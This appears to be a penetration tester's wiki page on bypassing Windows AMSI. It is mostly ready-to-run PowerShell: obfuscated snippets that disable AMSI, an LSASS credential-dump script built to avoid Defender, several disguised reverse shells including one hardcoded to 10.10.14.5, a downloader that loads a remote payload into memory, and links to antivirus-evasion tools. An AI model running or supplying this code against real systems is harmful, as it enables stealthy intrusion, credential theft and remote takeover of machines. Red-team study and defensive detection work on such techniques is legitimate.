# AMSI Bypassing

## Introduction

For basic information about [[ASMI]], but for actual [[AMSI-Exploitation]] contains a list of code snippets to exploit this article will be here just as a hub and overview of techniques - possibly restructure in the future. Anti-Malware Scan Interface is a general scripting language security feature that will allow any applications or services to integrate into antimalware products. It scan payloads and script before execution inside of the runtime.

The AMSI feature is integrated into these components of Windows 10.

-   User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
-   PowerShell (scripts, interactive use, and dynamic code evaluation)
-   Windows Script Host (wscript.exe and cscript.exe)
-   JavaScript and VBScript
-   Office VBA macros

AMSI Architecture
![](amsi7archi.jpg)

AMSI is instrumented in both System.Management.Automation.dll and within the CLR itself. When inside the CLR, it is assumed that Defender is already being instrumented; this means AMSI will only be called when loaded from memory.

Bypassing 

Test with: 
[amsi.fail](https://amsi.fail/) *"AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures."*



## Bypasses

One enumeration method for bypassing is compare target versions to bypass with [InsecurePowershell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master), which is a GitHub repository of PowerShell with security features removed. [S3cur3Th1sSh1t's currated List](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  is represented here with either code or  local links to big code blocks or Cheatsheats with function calls from the framework.

[[Nishang-Helpsheet]] - `Invoke-Amsibypass` will use  publicly known methods to bypass/avoid AMSI.

#### Patching asmi.dll

The bypasses that will identify DLL locations and modify memory permissions to return undetected AMSI response values.

Patching the  asmi.dll - [[AMSI-ScanBuffer-Patch]] - Egghunter with blog post: [https://www.contextis.com/us/blog/amsi-bypass](https://www.contextis.com/us/blog/amsi-bypass)

ScanBuffer patch - [[AMSI-Buffer-Patch-In-memory]]
ScanBuffer bypass - [Rasta-Mouse](https://github.com/rasta-mouse/AmsiScanBufferBypass)

#### Forcing errors

Force an error
```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

#### Graeber Reflection
[Matt Graeber's Reflection](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) utilizes Powershell to set the response value of ASMI to  `$null`

Matt Graebers Reflection method
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Matt Graebers Reflection method with WMF5 autologging bypass
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

Matt Graebers second Reflection method
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

If patched, just change up the strings/variables. 
```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)
```
Requires Credit!

If patched, just change up the strings/variables. 
```powershell
$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).
    substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
```
@TihanyiNorbert (Based on the original work of Matt Graeber @mattifestation script)

```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
[Buaq.net](https://buaq.net/go-98295.html)

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```



#### LSASS Dumping without triggering Windows Defender
```powershell
$S = "C:\temp"
$P = (Get-Process lsass)
$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
$C = [Reflection.BindingFlags] 'NonPublic, Static'
$D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
$PF = "$($P.Name)_$($P.Id).dmp"
$PDP = Join-Path $S $PF
$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
$F.Close()
```


#### Elevated Required

Turning off Windows Defender
```powershell
# Requires Elevation
Get-MpPreference | Select-Object -Property ExclusionPath
```

#### PowerShell downgrading

```powershell
powershell -version 2
```

#### Reverse Shells

```powershell
Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($args[0],$args[1]);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2  = $I + (pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()
```
Credit:
@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)

```powershell
$J = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
$SS = $J.GetStream();
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
$SS.Write($OO,0,$OO.Length)
$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
$SS.Write($OO,0,$OO.Length)
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
$GG = (i`eX $DD 2>&1 | Out-String );
$H  = $GG + (pwd).Path + '> ';
$L = ([text.encoding]::UTF8).GetBytes($H);
$SS.Write($L,0,$L.Length);
$SS.Flush()};
$J.Close()
```
Credit:
@TihanyiNorbert (Reverse shell based on the original nishang Framework written by @nikhil_mitt)

```powershell
$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
$I = $c.GetStream();
[byte[]]$U = 0..(2-shl15)|%{0};
$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
$I.Write($U,0,$U.Length)
$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$I.Write($U,0,$U.Length)
while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
$a = (iex $D 2>&1 | Out-String );
$r  = $a + (pwd).Path + '> ';
$m = ([text.encoding]::ASCII).GetBytes($r);
$I.Write($m,0,$m.Length);
$I.Flush()};
$c.Close()
```
Credit: @TihanyiNorbert (Based on the original nishang Framework written by @nikhil_mitt)

## Misc things:

WebClient DownloadData http://x.x.x.x/file.exe method:
```powershell
$bytes = (new-object net.webclient).downloaddata("http://10.10.16.74:8080/payload.exe")
[System.Reflection.Assembly]::Load($bytes)
$BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"
$main = [Shell].getmethod("Main", $BindingFlags)
$main.Invoke($null, $null)
```

Reverse PowerShell:
```powershell
$socket = new-object System.Net.Sockets.TcpClient('10.10.14.5', 4445);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
        $writer.Write("PS> ");
        $writer.Flush();
        $read = $null;
        while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $read);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2  = $sendback;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $writer.Write($sendbyte,0,$sendbyte.Length);
}While ($true);
$writer.close();$socket.close();
```






## Tools
Tools that may help with AV Evasion: 
- https://github.com/phra/PEzor
- https://github.com/bats3c/darkarmour
- https://github.com/loadenmb/tvasion




## References


[pentestlaboratories article](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
[AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[Documentation AMSI](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[Documentation - How AMSI Helps](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps)
[ASMI Result Documentation](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
[AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
[InsecurePowershell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master)
[S3cur3Th1sSh1t's currated List](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
[Matt Graeber's Reflection](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
[Buaq.net](https://buaq.net/go-98295.html)
[Sinfulz Cheatsheet](https://github.com/sinfulz/JustEvadeBro)